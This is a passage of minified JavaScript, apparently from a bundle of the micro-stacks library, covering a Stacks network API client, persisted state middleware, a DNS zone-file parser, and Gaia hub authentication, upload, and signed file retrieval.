                a(this, "fetcher", void 0),
                a(this, "getCoreApiUrl", () => this._coreApiUrl),
                a(this, "isMainnet", () => this.version === J.Mainnet),
                a(
                  this,
                  "getBroadcastApiUrl",
                  () => `${this.getCoreApiUrl()}${this.broadcastEndpoint}`
                ),
                a(
                  this,
                  "getTransferFeeEstimateApiUrl",
                  () =>
                    `${this.getCoreApiUrl()}${this.transferFeeEstimateEndpoint}`
                ),
                a(
                  this,
                  "getAccountApiUrl",
                  (e) =>
                    `${this.getCoreApiUrl()}${
                      this.accountEndpoint
                    }/${e}?proof=0`
                ),
                a(
                  this,
                  "getAbiApiUrl",
                  (e, t) =>
                    `${this.getCoreApiUrl()}${
                      this.contractAbiEndpoint
                    }/${e}/${t}`
                ),
                a(
                  this,
                  "getReadOnlyFunctionCallApiUrl",
                  (e, t, n) =>
                    `${this.getCoreApiUrl()}${
                      this.readOnlyFunctionCallEndpoint
                    }/${e}/${t}/${encodeURIComponent(n)}`
                ),
                a(this, "getInfoUrl", () => `${this.getCoreApiUrl()}/v2/info`),
                a(
                  this,
                  "getBlockTimeInfoUrl",
                  () =>
                    `${this.getCoreApiUrl()}/extended/v1/info/network_block_times`
                ),
                a(
                  this,
                  "getPoxInfoUrl",
                  () => `${this.getCoreApiUrl()}/v2/pox`
                ),
                a(this, "getRewardsUrl", (e, t) => {
                  let n = `${this.getCoreApiUrl()}/extended/v1/burnchain/rewards/${e}`;
                  return (
                    t && (n = `${n}?limit=${t.limit}&offset=${t.offset}`), n
                  );
                }),
                a(
                  this,
                  "getRewardsTotalUrl",
                  (e) =>
                    `${this.getCoreApiUrl()}/extended/v1/burnchain/rewards/${e}/total`
                ),
                a(this, "getRewardHoldersUrl", (e, t) => {
                  let n = `${this.getCoreApiUrl()}/extended/v1/burnchain/reward_slot_holders/${e}`;
                  return (
                    t && (n = `${n}?limit=${t.limit}&offset=${t.offset}`), n
                  );
                }),
                a(
                  this,
                  "getStackerInfoUrl",
                  (e, t) =>
                    `${this.getCoreApiUrl()}${
                      this.readOnlyFunctionCallEndpoint
                    }\n    ${e}/${t}/get-stacker-info`
                ),
                !e.url && !e.coreApiUrl)
              )
                throw Error(
                  "[miro-stacks] Network initialized with no api url"
                );
              (this._coreApiUrl = e.url || e.coreApiUrl),
                (this.bnsLookupUrl = e.bnsLookupUrl || e.url || e.coreApiUrl),
                (this.fetcher = e.fetcher || C);
            }
            getNameInfo(e) {
              let t = `${this.bnsLookupUrl}/v1/names/${e}`;
              return this.fetcher(t)
                .then((e) => {
                  if (404 === e.status) throw new Error("Name not found");
                  if (200 !== e.status)
                    throw new Error(`Bad response status: ${e.status}`);
                  return e.json();
                })
                .then((e) =>
                  e.address ? Object.assign({}, e, { address: e.address }) : e
                );
            }
          },
          fi = class extends ui {
            constructor() {
              super(
                arguments.length > 0 && void 0 !== arguments[0]
                  ? arguments[0]
                  : {
                      url: "https://stacks-node-api.testnet.stacks.co",
                      fetcher: C,
                    }
              ),
                a(this, "version", J.Testnet),
                a(this, "chainId", Z.Testnet);
            }
          };
        const hi = (e) => {
            let t;
            const n = new Set(),
              r = (e, r) => {
                const i = "function" === typeof e ? e(t) : e;
                if (i !== t) {
                  const e = t;
                  (t = (null != r ? r : "object" !== typeof i)
                    ? i
                    : Object.assign({}, t, i)),
                    n.forEach((n) => n(t, e));
                }
              },
              i = () => t,
              o = {
                setState: r,
                getState: i,
                subscribe: (e) => (n.add(e), () => n.delete(e)),
                destroy: () => n.clear(),
              };
            return (t = e(r, i, o)), o;
          },
          di = (e) => (t, n, r) => {
            const i = r.subscribe;
            r.subscribe = (e, t, n) => {
              let o = e;
              if (t) {
                const i = (null == n ? void 0 : n.equalityFn) || Object.is;
                let s = e(r.getState());
                (o = (n) => {
                  const r = e(n);
                  if (!i(s, r)) {
                    const e = s;
                    t((s = r), e);
                  }
                }),
                  (null == n ? void 0 : n.fireImmediately) && t(s, s);
              }
              return i(o);
            };
            return e(t, n, r);
          },
          pi = (e) => (t) => {
            try {
              const n = e(t);
              return n instanceof Promise
                ? n
                : {
                    then: (e) => pi(e)(n),
                    catch(e) {
                      return this;
                    },
                  };
            } catch (Y) {
              return {
                then(e) {
                  return this;
                },
                catch: (t) => pi(t)(Y),
              };
            }
          },
          gi = (e, t) => (n, r, i) => {
            let o = {
                getStorage: () => localStorage,
                serialize: JSON.stringify,
                deserialize: JSON.parse,
                partialize: (e) => e,
                version: 0,
                merge: (e, t) => ({ ...t, ...e }),
                ...t,
              },
              s = !1;
            const a = new Set(),
              l = new Set();
            let c;
            try {
              c = o.getStorage();
            } catch (Y) {}
            if (!c)
              return e(
                function () {
                  console.warn(
                    `[zustand persist middleware] Unable to update item '${o.name}', the given storage is currently unavailable.`
                  ),
                    n(...arguments);
                },
                r,
                i
              );
            const u = pi(o.serialize),
              f = () => {
                const e = o.partialize({ ...r() });
                let t;
                const n = u({ state: e, version: o.version })
                  .then((e) => c.setItem(o.name, e))
                  .catch((e) => {
                    t = e;
                  });
                if (t) throw t;
                return n;
              },
              h = i.setState;
            i.setState = (e, t) => {
              h(e, t), f();
            };
            const d = e(
              function () {
                n(...arguments), f();
              },
              r,
              i
            );
            let p;
            const g = () => {
              var e;
              if (!c) return;
              (s = !1), a.forEach((e) => e(r()));
              const t =
                (null == (e = o.onRehydrateStorage)
                  ? void 0
                  : e.call(o, r())) || void 0;
              return pi(c.getItem.bind(c))(o.name)
                .then((e) => {
                  if (e) return o.deserialize(e);
                })
                .then((e) => {
                  if (e) {
                    if (
                      "number" !== typeof e.version ||
                      e.version === o.version
                    )
                      return e.state;
                    if (o.migrate) return o.migrate(e.state, e.version);
                    console.error(
                      "State loaded from storage couldn't be migrated since no migrate function was provided"
                    );
                  }
                })
                .then((e) => {
                  var t;
                  return (
                    (p = o.merge(e, null != (t = r()) ? t : d)), n(p, !0), f()
                  );
                })
                .then(() => {
                  null == t || t(p, void 0), (s = !0), l.forEach((e) => e(p));
                })
                .catch((e) => {
                  null == t || t(void 0, e);
                });
            };
            return (
              (i.persist = {
                setOptions: (e) => {
                  (o = { ...o, ...e }), e.getStorage && (c = e.getStorage());
                },
                clearStorage: () => {
                  null == c || c.removeItem(o.name);
                },
                getOptions: () => o,
                rehydrate: () => g(),
                hasHydrated: () => s,
                onHydrate: (e) => (
                  a.add(e),
                  () => {
                    a.delete(e);
                  }
                ),
                onFinishHydration: (e) => (
                  l.add(e),
                  () => {
                    l.delete(e);
                  }
                ),
              }),
              g(),
              p || d
            );
          };
        var yi = !0,
          wi = "Invariant failed";
        function mi(e) {
          return (
            (e = (function (e) {
              let t = /(^|[^\\]);.*/g;
              return e.replace(t, function (e, t) {
                return t || "";
              });
            })(e)),
            (e = (function (e) {
              let t = [],
                n = /\([\s\S]*?\)/gim,
                r = n.exec(e);
              for (; null !== r; ) {
                let i = r[0].replace(/\s+/gm, " ");
                t.push({ match: r, replacement: i }), (r = n.exec(e));
              }
              let i = e.split("");
              for (let o of t) {
                let { match: e, replacement: t } = o;
                i.splice(e.index, e[0].length, t);
              }
              return i.join("").replace(/\(|\)/gim, " ");
            })(e)),
            (function (e) {
              let t = {},
                n = e.split("\n");
              for (let r of n) {
                if (!r || !r.trim()) continue;
                let e = r.toUpperCase();
                /\s+TXT\s+/.test(e)
                  ? ((t.txt = t.txt || []), t.txt.push(ki(r)))
                  : 0 === e.indexOf("$ORIGIN")
                  ? (t.$origin = r.split(/\s+/g)[1])
                  : 0 === e.indexOf("$TTL")
                  ? (t.$ttl = parseInt(r.split(/\s+/g)[1], 10))
                  : /\s+SOA\s+/.test(e)
                  ? (t.soa = bi(r))
                  : /\s+NS\s+/.test(e)
                  ? ((t.ns = t.ns || []), t.ns.push(vi(r)))
                  : /\s+A\s+/.test(e)
                  ? ((t.a = t.a || []), t.a.push(Ei(r, t.a)))
                  : /\s+AAAA\s+/.test(e)
                  ? ((t.aaaa = t.aaaa || []), t.aaaa.push(Si(r)))
                  : /\s+CNAME\s+/.test(e)
                  ? ((t.cname = t.cname || []), t.cname.push(xi(r)))
                  : /\s+MX\s+/.test(e)
                  ? ((t.mx = t.mx || []), t.mx.push(Ai(r)))
                  : /\s+PTR\s+/.test(e)
                  ? ((t.ptr = t.ptr || []), t.ptr.push(Ti(r, t.ptr, t.$origin)))
                  : /\s+SRV\s+/.test(e)
                  ? ((t.srv = t.srv || []), t.srv.push(Ci(r)))
                  : /\s+SPF\s+/.test(e)
                  ? ((t.spf = t.spf || []), t.spf.push(Ii(r)))
                  : /\s+URI\s+/.test(e) &&
                    ((t.uri = t.uri || []), t.uri.push(Oi(r)));
              }
              return t;
            })(e)
          );
        }
        function bi(e) {
          let t = {},
            n = e.trim().split(/\s+/g),
            r = n.length;
          return (
            (t.name = n[0]),
            (t.minimum = parseInt(n[r - 1], 10)),
            (t.expire = parseInt(n[r - 2], 10)),
            (t.retry = parseInt(n[r - 3], 10)),
            (t.refresh = parseInt(n[r - 4], 10)),
            (t.serial = parseInt(n[r - 5], 10)),
            (t.rname = n[r - 6]),
            (t.mname = n[r - 7]),
            isNaN(n[1]) || (t.ttl = parseInt(n[1], 10)),
            t
          );
        }
        function vi(e) {
          let t = e.trim().split(/\s+/g),
            n = t.length,
            r = { name: t[0], host: t[n - 1] };
          return isNaN(t[1]) || (r.ttl = parseInt(t[1], 10)), r;
        }
        function Ei(e, t) {
          let n = e.trim().split(/\s+/g),
            r = e.trim().toUpperCase().split(/\s+/g),
            i = n.length,
            o = { name: n[0], ip: n[i - 1] };
          return (
            0 === r.lastIndexOf("A") &&
              (t.length ? (o.name = t[t.length - 1].name) : (o.name = "@")),
            isNaN(n[1]) || (o.ttl = parseInt(n[1], 10)),
            o
          );
        }
        function Si(e) {
          let t = e.trim().split(/\s+/g),
            n = t.length,
            r = { name: t[0], ip: t[n - 1] };
          return isNaN(t[1]) || (r.ttl = parseInt(t[1], 10)), r;
        }
        function xi(e) {
          let t = e.trim().split(/\s+/g),
            n = t.length,
            r = { name: t[0], alias: t[n - 1] };
          return isNaN(t[1]) || (r.ttl = parseInt(t[1], 10)), r;
        }
        function Ai(e) {
          let t = e.trim().split(/\s+/g),
            n = t.length,
            r = {
              name: t[0],
              preference: parseInt(t[n - 2], 10),
              host: t[n - 1],
            };
          return isNaN(t[1]) || (r.ttl = parseInt(t[1], 10)), r;
        }
        function ki(e) {
          let t = e.trim().match(/[^\s"']+|"[^"]*"|'[^']*'/g);
          if (!t) throw new Error("Failure to tokenize TXT record");
          let n,
            r = t.length,
            i = t.indexOf("TXT");
          function o(e) {
            return e.indexOf('"') > -1 && (e = e.split('"')[1]), e;
          }
          n = r - i - 1 > 1 ? [...t.slice(i + 1).map(o)] : o(t[r - 1]);
          let s = { name: t[0], txt: n };
          return isNaN(t[1]) || (s.ttl = parseInt(t[1], 10)), s;
        }
        function Ti(e, t, n) {
          let r = e.trim().split(/\s+/g);
          0 === e.trim().toUpperCase().split(/\s+/g).lastIndexOf("PTR") &&
            t[t.length - 1] &&
            r.unshift(t[t.length - 1].name);
          let i = r.length,
            o = { name: r[0], fullname: `${r[0]}.${n}`, host: r[i - 1] };
          return isNaN(r[1]) || (o.ttl = parseInt(r[1], 10)), o;
        }
        function Ci(e) {
          let t = e.trim().split(/\s+/g),
            n = t.length,
            r = {
              name: t[0],
              target: t[n - 1],
              priority: parseInt(t[n - 4], 10),
              weight: parseInt(t[n - 3], 10),
              port: parseInt(t[n - 2], 10),
            };
          return isNaN(t[1]) || (r.ttl = parseInt(t[1], 10)), r;
        }
        function Ii(e) {
          let t = e.trim().split(/\s+/g),
            n = { name: t[0], data: "" },
            r = t.length;
          for (; r-- > 4; ) n.data = t[r] + " " + n.data.trim();
          return isNaN(t[1]) || (n.ttl = parseInt(t[1], 10)), n;
        }
        function Oi(e) {
          let t = e.trim().split(/\s+/g),
            n = t.length,
            r = {
              name: t[0],
              target: t[n - 1].replace(/"/g, ""),
              priority: parseInt(t[n - 3], 10),
              weight: parseInt(t[n - 2], 10),
            };
          return isNaN(t[1]) || (r.ttl = parseInt(t[1], 10)), r;
        }
        var Bi = Object.defineProperty;
        function Pi(e) {
          var t;
          return null !==
            (t =
              null == e ? void 0 : e.map((e) => ({ ...e, domain: e.path }))) &&
            void 0 !== t
            ? t
            : null;
        }
        function _i(e) {
          let {
              hubInfo: t,
              privateKey: n,
              gaiaHubUrl: r,
              associationToken: i = null,
              scopes: o,
            } = e,
            { challenge_text: s } = t;
          return {
            gaiaChallenge: s,
            hubUrl: r,
            iss: g(Fe(n, !0)),
            salt: un(16).toString(),
            associationToken: i,
            scopes: Pi(o),
          };
        }
        var Ui = {
          challenge_text:
            '["gaiahub","0","storage2.blockstack.org","blockstack_storage_please_sign"]',
          latest_auth_version: "v1",
          max_file_upload_size_megabytes: 20,
          read_url_prefix: "https://gaia.blockstack.org/hub/",
        };
        function Ni(e) {
          let {
              gaiaHubUrl: t,
              privateKey: n,
              associationToken: r,
              scopes: i,
            } = e,
            o = Ui,
            { read_url_prefix: s, max_file_upload_size_megabytes: a } = o,
            l = (function (e) {
              let t = _i(e);
              return `v1:${new Fn("ES256K", e.privateKey).signSync(t)}`;
            })({
              hubInfo: o,
              privateKey: n,
              gaiaHubUrl: t,
              associationToken: r,
              scopes: i,
            });
          return {
            address: kn(n),
            url_prefix: s,
            token: l,
            server: t,
            max_file_upload_size_megabytes: null !== a && void 0 !== a ? a : 20,
          };
        }
        var Ri = {
          MISSING_PARAMETER: "missing_parameter",
          REMOTE_SERVICE_ERROR: "remote_service_error",
          INVALID_STATE: "invalid_state",
          NO_SESSION_DATA: "no_session_data",
          DOES_NOT_EXIST: "does_not_exist",
          FAILED_DECRYPTION_ERROR: "failed_decryption_error",
          INVALID_DID_ERROR: "invalid_did_error",
          NOT_ENOUGH_FUNDS_ERROR: "not_enough_error",
          INVALID_AMOUNT_ERROR: "invalid_amount_error",
          LOGIN_FAILED_ERROR: "login_failed",
          SIGNATURE_VERIFICATION_ERROR: "signature_verification_failure",
          CONFLICT_ERROR: "conflict_error",
          NOT_ENOUGH_PROOF_ERROR: "not_enough_proof_error",
          BAD_PATH_ERROR: "bad_path_error",
          VALIDATION_ERROR: "validation_error",
          PAYLOAD_TOO_LARGE_ERROR: "payload_too_large_error",
          PRECONDITION_FAILED_ERROR: "precondition_failed_error",
          UNKNOWN: "unknown",
        };
        Object.freeze(Ri);
        var Li = class extends Error {
            constructor(e) {
              super(),
                a(this, "message", void 0),
                a(this, "code", void 0),
                a(this, "parameter", void 0);
              let t = e.message,
                n = `Error Code: ${e.code}`,
                r = this.stack;
              if (r) n += `Stack Trace:\n${r}`;
              else
                try {
                  throw new Error();
                } catch (Zt) {
                  r = Zt.stack;
                }
              (t += `\nIf you believe this exception is caused by a bug in blockstack.js,\n      please file a bug report: https://github.com/blockstack/blockstack.js/issues\n\n${n}`),
                (this.message = t),
                (this.code = e.code),
                (this.parameter = e.parameter ? e.parameter : void 0);
            }
            toString() {
              return `${super.toString()}\n    code: ${this.code} param: ${
                this.parameter ? this.parameter : "n/a"
              }`;
            }
          },
          $i = class extends Li {
            constructor(e) {
              let t = `Failed to verify signature: ${e}`;
              super({ code: Ri.SIGNATURE_VERIFICATION_ERROR, message: t }),
                (this.message = t),
                (this.name = "SignatureVerificationError");
            }
          },
          Hi = class extends Li {
            constructor(e, t) {
              super(e),
                a(this, "hubError", void 0),
                t &&
                  ((this.hubError = {
                    statusCode: t.status,
                    statusText: t.statusText,
                  }),
                  "string" == typeof t.body
                    ? (this.hubError.message = t.body)
                    : "object" == typeof t.body &&
                      Object.assign(this.hubError, t.body));
            }
          },
          Di = class extends Hi {
            constructor(e, t) {
              super({ message: e, code: Ri.DOES_NOT_EXIST }, t),
                (this.name = "DoesNotExist");
            }
          },
          Mi = class extends Hi {
            constructor(e, t) {
              super({ message: e, code: Ri.CONFLICT_ERROR }, t),
                (this.name = "ConflictError");
            }
          },
          Fi = class extends Hi {
            constructor(e, t) {
              super({ message: e, code: Ri.NOT_ENOUGH_PROOF_ERROR }, t),
                (this.name = "NotEnoughProofError");
            }
          },
          ji = class extends Hi {
            constructor(e, t) {
              super({ message: e, code: Ri.BAD_PATH_ERROR }, t),
                (this.name = "BadPathError");
            }
          },
          zi = class extends Hi {
            constructor(e, t) {
              super({ message: e, code: Ri.VALIDATION_ERROR }, t),
                (this.name = "ValidationError");
            }
          },
          Ki = class extends Hi {
            constructor(e, t, n) {
              super({ message: e, code: Ri.PAYLOAD_TOO_LARGE_ERROR }, t),
                a(this, "hubError", void 0),
                a(this, "maxUploadByteSize", void 0),
                (this.name = "PayloadTooLargeError"),
                (this.maxUploadByteSize = n);
            }
          },
          Wi = class extends Hi {
            constructor(e, t) {
              super({ message: e, code: Ri.PRECONDITION_FAILED_ERROR }, t),
                (this.name = "PreconditionFailedError");
            }
          };
        function Vi(e) {
          return Number.isFinite(e) ? Math.floor(1024 * e * 1024) : 0;
        }
        async function qi(e, t, n) {
          if (e.ok)
            throw new Error("Cannot get a Stacks from a valid response.");
          let r = await (async function (e) {
            let t,
              n = "";
            try {
              n = await e.text();
              try {
                t = JSON.parse(n);
              } catch {}
            } catch (Wn) {
              console.debug(`Error getting bad http response text: ${Wn}`);
            }
            return { status: e.status, statusText: e.statusText, body: t || n };
          })(e);
          if (401 === r.status) throw new zi(t, r);
          if (402 === r.status) throw new Fi(t, r);
          if (403 === r.status) throw new ji(t, r);
          if (404 === r.status) throw new Di(t, r);
          if (409 === r.status) throw new Mi(t, r);
          if (412 === r.status) throw new Wi(t, r);
          if (413 === r.status) {
            let e =
              n && n.max_file_upload_size_megabytes
                ? Vi(n.max_file_upload_size_megabytes)
                : 0;
            throw new Ki(t, r, e);
          }
          throw new Error(t);
        }
        async function Gi(e) {
          let {
              filename: t,
              contents: n,
              hubConfig: r,
              contentType: i = "application/octet-stream",
            } = e,
            o = { "Content-Type": i, Authorization: `bearer ${r.token}` },
            s = await C(`${r.server}/store/${r.address}/${t}`, {
              method: "POST",
              headers: o,
              body: n,
            });
          if (!s.ok) throw await qi(s, "Error when uploading to Gaia hub.", r);
          let a = await s.text();
          return JSON.parse(a);
        }
        function Yi(e, t) {
          return Promise.resolve(`${t.url_prefix}${t.address}/${e}`);
        }
        var Zi = ".sig",
          Ji = "https://stacks-node-api.stacks.co/v1/names",
          Xi = class e {
            constructor(t, n) {
              a(this, "content", void 0),
                a(this, "wasString", void 0),
                a(this, "contentType", void 0),
                a(this, "contentByteLength", void 0),
                a(this, "loadedData", void 0),
                (this.wasString = "string" == typeof t),
                (this.content = e.normalizeContentDataType(t, n)),
                (this.contentType = n || this.detectContentType()),
                (this.contentByteLength = this.detectContentLength());
            }
            static normalizeContentDataType(e, t) {
              try {
                if ("string" == typeof e) {
                  let n = (t || "").toLowerCase().replace("-", "");
                  if (
                    n.includes("charset") &&
                    !n.includes("charset=utf8") &&
                    !n.includes("charset=ascii")
                  )
                    throw new Error(
                      `Unable to determine byte length with charset: ${t}`
                    );
                  return new TextEncoder().encode(e);
                }
                if (e instanceof Uint8Array) return e;
                if (ArrayBuffer.isView(e))
                  return new Uint8Array(e.buffer, e.byteOffset, e.byteLength);
                if (typeof Blob < "u" && e instanceof Blob) return e;
                if (e instanceof ArrayBuffer) return new Uint8Array(e);
                if (Array.isArray(e)) {
                  if (
                    e.length > 0 &&
                    (!Number.isInteger(e[0]) || e[0] < 0 || e[0] > 255)
                  )
                    throw new Error(
                      `Unexpected array values provided as file data: value "${e[0]}" at index 0 is not an octet number. ${this.supportedTypesMsg}`
                    );
                  return new Uint8Array(e);
                }
                {
                  let t = Object.prototype.toString.call(e);
                  throw new Error(
                    `Unexpected type provided as file data: ${t}. ${this.supportedTypesMsg}`
                  );
                }
              } catch (hn) {
                throw (
                  (console.error(hn), new Error(`Error processing data: ${hn}`))
                );
              }
            }
            detectContentType() {
              return this.wasString
                ? "text/plain; charset=utf-8"
                : typeof Blob < "u" &&
                  this.content instanceof Blob &&
                  this.content.type
                ? this.content.type
                : "application/octet-stream";
            }
            detectContentLength() {
              if (
                ArrayBuffer.isView(this.content) ||
                this.content instanceof Uint8Array
              )
                return this.content.byteLength;
              if (typeof Blob < "u" && this.content instanceof Blob)
                return this.content.size;
              let e = Object.prototype.toString.call(this.content),
                t = new Error(
                  `Unexpected type "${e}" while detecting content length`
                );
              throw (console.error(t), t);
            }
            async loadContent() {
              try {
                if (this.content instanceof Uint8Array) return this.content;
                if (ArrayBuffer.isView(this.content))
                  return new Uint8Array(
                    this.content.buffer,
                    this.content.byteOffset,
                    this.content.byteLength
                  );
                if (typeof Blob < "u" && this.content instanceof Blob) {
                  let e = new FileReader();
                  return await new Promise((t, n) => {
                    (e.onerror = (e) => {
                      n(e);
                    }),
                      (e.onload = () => {
                        let n = e.result;
                        t(new Uint8Array(n));
                      }),
                      e.readAsArrayBuffer(this.content);
                  });
                }
                {
                  let e = Object.prototype.toString.call(this.content);
                  throw new Error(`Unexpected type ${e}`);
                }
              } catch (Y) {
                console.error(Y);
                let t = new Error(`Error loading content: ${Y}`);
                throw (console.error(t), t);
              }
            }
            load() {
              return (
                void 0 === this.loadedData &&
                  (this.loadedData = this.loadContent()),
                this.loadedData
              );
            }
          };
        function Qi(e, t) {
          let n;
          return (
            t.proof && t.proof.url && (n = t.proof.url),
            {
              "@type": "Account",
              service: e,
              identifier: t.username,
              proofType: "http",
              proofUrl: n,
            }
          );
        }
        function eo(e, t) {
          let n = t
            ? (function (e, t) {
                let n = zn(e);
                if (!n) throw Error("no decoded token");
                let r = n.payload;
                if ("string" == typeof r)
                  throw new Error("Unexpected token payload type of string");
                if (!r.hasOwnProperty("subject") || !r.subject)
                  throw new Error("Token doesn't have a subject");
                if (!r.subject.hasOwnProperty("publicKey"))
                  throw new Error("Token doesn't have a subject public key");
                if (!r.hasOwnProperty("issuer") || !r.issuer)
                  throw new Error("Token doesn't have an issuer");
                if (!r.issuer.hasOwnProperty("publicKey"))
                  throw new Error("Token doesn't have an issuer public key");
                if (!r.hasOwnProperty("claim"))
                  throw new Error("Token doesn't have a claim");
                let i = r.issuer.publicKey,
                  o = An(i);
                if (t !== i && t !== o)
                  throw new Error(
                    "Token issuer public key does not match the verifying value"
                  );
                let s = new jn(n.header.alg, i);
                if (!s) throw new Error("Invalid token verifier");
                if (!s.verify(e)) throw new Error("Token verification failed");
                return n;
              })(e, t)
            : zn(e);
          if (n && n.hasOwnProperty("payload")) {
            let e = n.payload;
            if ("string" == typeof e)
              throw new Error(
                "[micro-stacks] extractProfile: Unexpected token payload type of string"
              );
            if (e.hasOwnProperty("claim")) return e.claim;
          }
          return {};
        }
        async function to(e, t) {
          let n = mi(e);
          if (
            (n.hasOwnProperty("$origin") || (n = null),
            !(n && Object.keys(n).length > 0))
          )
            return (function (e) {
              let t = { "@type": "Person" };
              if (e) {
                e.name && e.name.formatted && (t.name = e.name.formatted),
                  e.bio && (t.description = e.bio),
                  e.location &&
                    e.location.formatted &&
                    (t.address = {
                      "@type": "PostalAddress",
                      addressLocality: e.location.formatted,
                    });
                let n = [];
                e.avatar &&
                  e.avatar.url &&
                  n.push({
                    "@type": "ImageObject",
                    name: "avatar",
                    contentUrl: e.avatar.url,
                  }),
                  e.cover &&
                    e.cover.url &&
                    n.push({
                      "@type": "ImageObject",
                      name: "cover",
                      contentUrl: e.cover.url,
                    }),
                  n.length && (t.image = n),
                  e.website &&
                    (t.website = [{ "@type": "WebSite", url: e.website }]);
                let r = [];
                e.bitcoin &&
                  e.bitcoin.address &&
                  r.push({
                    "@type": "Account",
                    role: "payment",
                    service: "bitcoin",
                    identifier: e.bitcoin.address,
                  }),
                  e.twitter &&
                    e.twitter.username &&
                    r.push(Qi("twitter", e.twitter)),
                  e.facebook &&
                    e.facebook.username &&
                    r.push(Qi("facebook", e.facebook)),
                  e.github &&
                    e.github.username &&
                    r.push(Qi("github", e.github)),
                  e.auth &&
                    e.auth.length > 0 &&
                    e.auth[0] &&
                    e.auth[0].publicKeychain &&
                    r.push({
                      "@type": "Account",
                      role: "key",
                      service: "bip32",
                      identifier: e.auth[0].publicKeychain,
                    }),
                  e.pgp &&
                    e.pgp.url &&
                    r.push({
                      "@type": "Account",
                      role: "key",
                      service: "pgp",
                      identifier: e.pgp.fingerprint,
                      contentUrl: e.pgp.url,
                    }),
                  (t.account = r);
              }
              return t;
            })(JSON.parse(e));
          let r = (function (e) {
            if (
              !e.hasOwnProperty("uri") ||
              !Array.isArray(e.uri) ||
              e.uri.length < 1
            )
              return null;
            let t = e.uri.filter(
              (e) => e.hasOwnProperty("target") && "_http._tcp" === e.name
            );
            if (t.length < 1) return null;
            let n = t[0];
            if (!n.hasOwnProperty("target")) return null;
            let r = n.target;
            return (
              r.startsWith("https") ||
                r.startsWith("http") ||
                (r = `https://${r}`),
              r
            );
          })(n);
          if (r)
            try {
              return eo((await (await C(r)).json())[0].token, t);
            } catch (Zt) {
              throw (
                (console.error(
                  `[micro-stacks] resolveZoneFileToProfile: error fetching token file ${r}: ${Zt}`
                ),
                Zt)
              );
            }
          return (
            console.debug(
              "[micro-stacks] Token file url not found. Resolving to blank profile."
            ),
            {}
          );
        }
        async function no(e, t, n, r) {
          let i,
            o = await (async function (e) {
              let { username: t, zoneFileLookupURL: n = Ji } = e;
              if (!t) return Promise.reject();
              let r = `${n.replace(/\/$/, "")}/${e.username}`,
                i = await (await C(r)).json();
              if (i.hasOwnProperty("zonefile") && i.hasOwnProperty("address"))
                return await to(i.zonefile, e.verify ? i.address : void 0);
              throw new Error(
                "Invalid zonefile lookup response: did not contain `address` or `zonefile` field"
              );
            })({ username: t, zoneFileLookupURL: r });
          if (o)
            return (
              o.hasOwnProperty("apps")
                ? o.apps.hasOwnProperty(n) &&
                  (i = `${o.apps[n].replace(/\/?(\?|#|$)/, "/$1")}${e}`)
                : o.hasOwnProperty("appsMeta") &&
                  o.appsMeta.hasOwnProperty(n) &&
                  (i = `${o.appsMeta[n].replace(/\/?(\?|#|$)/, "/$1")}${e}`),
              i
            );
        }
        async function ro(e) {
          let t,
            { app: n, username: r, zoneFileLookupURL: i, gaiaHubConfig: o } = e;
          r ? (t = await no("/", r, n, i)) : o && (t = await Yi("/", o));
          let s = /([13][a-km-zA-HJ-NP-Z0-9]{26,35})/.exec(t);
          if (!s) throw new Error("Failed to parse gaia address");
          return s[s.length - 1];
        }
        async function io(e) {
          let {
              path: t,
              forceText: n,
              app: r,
              username: i,
              zoneFileLookupURL: o,
              gaiaHubConfig: s,
            } = e,
            a = await (async function (e, t) {
              let n;
              if (
                ((n = t.username
                  ? await no(e, t.username, t.app, t.zoneFileLookupURL)
                  : await Yi(e, t.gaiaHubConfig)),
                n)
              )
                return n;
              throw new Error("Missing readURL");
            })(t, {
              app: r,
              username: i,
              zoneFileLookupURL: o,
              gaiaHubConfig: s,
            }),
            c = await C(a);
          if (!c.ok) throw await qi(c, `getFile ${t} failed.`, null);
          let u = c.headers.get("Content-Type");
          if (
            ("string" == typeof u && (u = u.toLowerCase()),
            n ||
              null === u ||
              u.startsWith("text") ||
              u.startsWith("application/json"))
          )
            return c.text();
          return l(await c.arrayBuffer());
        }
        async function oo(e, t) {
          let n = {
            decrypt: !0,
            verify: !1,
            app: c("location", { returnEmptyObject: !0 }).origin,
            zoneFileLookupURL: Ji,
            ...t,
          };
          if (n.verify && !n.decrypt)
            return (async function (e, t) {
              let {
                  app: n,
                  username: r,
                  zoneFileLookupURL: i,
                  gaiaHubConfig: o,
                } = t,
                s = `${e}${Zi}`;
              try {
                let t,
                  a,
                  [l, c, u] = await Promise.all([
                    io({
                      path: e,
                      app: n,
                      username: r,
                      zoneFileLookupURL: i,
                      forceText: !1,
                      gaiaHubConfig: o,
                    }),
                    io({
                      path: s,
                      app: n,
                      username: r,
                      zoneFileLookupURL: i,
                      forceText: !0,
                      gaiaHubConfig: o,
                    }),
                    ro({
                      app: n,
                      username: r,
                      zoneFileLookupURL: i,
                      gaiaHubConfig: o,
                    }),
                  ]);
                if (!l) return l;
                if (!u)
                  throw new $i(
                    `Failed to get gaia address for verification of: ${e}`
                  );
                if (!c || "string" != typeof c)
                  throw new $i(
                    `Failed to obtain signature for file: ${e} -- looked in ${e}${Zi}`
                  );
                try {
                  let e = JSON.parse(c);
                  (t = e.signature), (a = e.publicKey);
                } catch (y) {
                  throw y instanceof SyntaxError
                    ? new Error(
                        `Failed to parse signature content JSON (path: ${e}${Zi}) The content may be corrupted.`
                      )
                    : y;
                }
                let f = Tn(a),
                  d = On({
                    signature: t,
                    contents: "string" == typeof l ? h(l) : l,
                    publicKey: a,
                  });
                if (u !== f)
                  throw new $i(
                    `Signer pubkey address (${f}) doesn't match gaia address (${u})`
                  );
                if (d) return l;
                throw new $i(
                  `Contents do not match ECDSA signature: path: ${e}, signature: ${e}${Zi}`
                );
              } catch (a) {
                throw a instanceof Di && a.message.indexOf(s) >= 0
                  ? new $i(
                      `Failed to obtain signature for file: ${e} -- looked in ${e}${Zi}`
                    )
                  : a;
              }
            })(e, n);
          let r = await io({
            path: e,
            app: n.app,
            username: n.username,
            zoneFileLookupURL: n.zoneFileLookupURL,
            forceText: !!n.decrypt,
            gaiaHubConfig: n.gaiaHubConfig,
          });
          if (null === r) return r;
          if ("string" != typeof r)
            throw new Error(
              "[micro-stacks/storage] Expected to get back a string for the cipherText"
            );
          let i = !!n.verify,
            o = !!n.decrypt,
            s = "string" == typeof n.decrypt ? n.decrypt : n.privateKey;
          if (
            (r.includes("signature") && r.includes("publicKey") && (i = !0),
            r.includes("cipherText") && r.includes("ephemeralPK") && (o = !0),
            !i && !o)
          )
            return r;
          let a = !r.includes("cipherText");
          if (o && a)
            throw new Error(
              `[micro-stacks/storage] Expected to get back a string that includes cipherText, is it encrypted? got back: ${JSON.stringify(
